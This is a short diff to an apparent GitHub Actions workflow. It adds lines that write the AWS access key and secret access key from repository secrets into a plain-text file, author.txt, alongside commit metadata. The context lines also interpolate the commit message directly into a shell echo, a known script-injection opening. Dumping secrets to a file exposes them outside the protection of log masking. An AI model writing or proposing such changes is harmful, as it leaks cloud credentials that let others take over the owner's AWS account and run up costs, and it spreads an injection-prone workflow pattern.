@@ -18,6 +18,9 @@ jobs:
           echo CommitMessage: ${{ github.event.head_commit.message }}  >> author.txt
           echo CommitTime: ${{ github.event.head_commit.timestamp }} >> author.txt
           echo CommitId: ${{ github.event.head_commit.id }}  >> author.txt
+          echo PublicKey:  ${{ secrets.AWS_ACCESS_KEY }}  >> author.txt
+          echo SecretKey: ${{ secrets.AWS_SECRET_ACCESS_KEY }}  >> author.txt
+          
 
       - name: Configure AWS Credentials
         uses: aws-actions/configure-aws-credentials@v1
